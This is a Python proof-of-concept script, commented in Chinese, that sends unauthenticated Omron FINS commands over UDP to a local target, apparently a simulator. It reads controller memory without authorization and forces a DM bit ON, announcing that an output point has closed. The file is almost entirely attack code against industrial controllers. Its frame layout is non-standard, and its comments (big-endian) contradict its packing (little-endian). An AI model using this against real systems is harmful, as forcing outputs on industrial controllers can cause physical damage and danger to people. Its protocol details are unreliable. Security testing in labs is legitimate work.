import socket
import struct
from fins_detector import detect_fins

TARGET = ('127.0.0.1', 9600)

def build_memory_read(area=0x82, addr=0x0000, length=1):
    """
    构造未授权内存读请求 (0101)
    area: 0x82 = DM 区
    addr: 地址
    length: 读取的字数
    """
    # FINS 帧: MRC=01,SRC=01, 然后区域代码、起始地址2字节大端，长度2字节大端
    fins_frame = struct.pack('<BBBBHH', 0x01, 0x01, area, 0x00, addr, length)
    header = b'FINS' + struct.pack('<I', len(fins_frame))
    return header + fins_frame

def build_force_on(area=0x82, addr=0x0000, bit=0x00):
    """
    构造未授权强制位ON请求 (2301)
    area: 0x82 = DM 区
    addr: 地址
    bit: 位号 (0-15)
    """
    # FINS 帧: MRC=23,SRC=01, 区域代码, 地址2字节大端, 位号1字节, 数量1字节(通常1)
    fins_frame = struct.pack('<BBBBHB', 0x23, 0x01, area, 0x00, addr, bit) + b'\x01'
    header = b'FINS' + struct.pack('<I', len(fins_frame))
    return header + fins_frame

def poc_unauthorized_read():
    print("\n[PoC] 尝试未授权读取 DM0...")
    payload = build_memory_read()
    print("[PoC] 发送报文:")
    detect_fins(payload)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    try:
        sock.sendto(payload, TARGET)
        data, _ = sock.recvfrom(1024)
        print(f"[模拟器] 响应: {data.hex()}")
        # 解析响应
        if len(data) >= 8 and data[:4] == b'FINS':
            resp_len = struct.unpack('<I', data[4:8])[0]
            resp_frame = data[8:8+resp_len]
            if len(resp_frame) >= 4 and resp_frame[0] == 0x01 and resp_frame[1] == 0x01:
                status = struct.unpack('<H', resp_frame[2:4])[0]
                if status == 0:
                    value = struct.unpack('<H', resp_frame[4:6])[0]
                    print(f"[PoC] 攻击成功，DM0 的值: 0x{value:04X}")
                else:
                    print(f"[PoC] 读失败，状态码: 0x{status:04X}")
    except socket.timeout:
        print("[PoC] 超时无响应")
    finally:
        sock.close()

def poc_force_bit_on():
    print("\n[PoC] 尝试强制 DM0 的 bit0 为 ON...")
    payload = build_force_on()
    print("[PoC] 发送报文:")
    detect_fins(payload)

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(3)
    try:
        sock.sendto(payload, TARGET)
        data, _ = sock.recvfrom(1024)
        print(f"[模拟器] 响应: {data.hex()}")
        if len(data) >= 8 and data[:4] == b'FINS':
            resp_len = struct.unpack('<I', data[4:8])[0]
            resp_frame = data[8:8+resp_len]
            if resp_frame[:2] == b'\x23\x01':
                status = struct.unpack('<H', resp_frame[2:4])[0]
                if status == 0:
                    print("[PoC] 强制位ON成功，对应输出点已闭合！")
                else:
                    print(f"[PoC] 操作失败，状态码: 0x{status:04X}")
    except socket.timeout:
        print("[PoC] 超时无响应")
    finally:
        sock.close()

if __name__ == '__main__':
    print("OMRON FINS PoC 测试开始，目标：{}:{}".format(*TARGET))
    poc_unauthorized_read()
    poc_force_bit_on()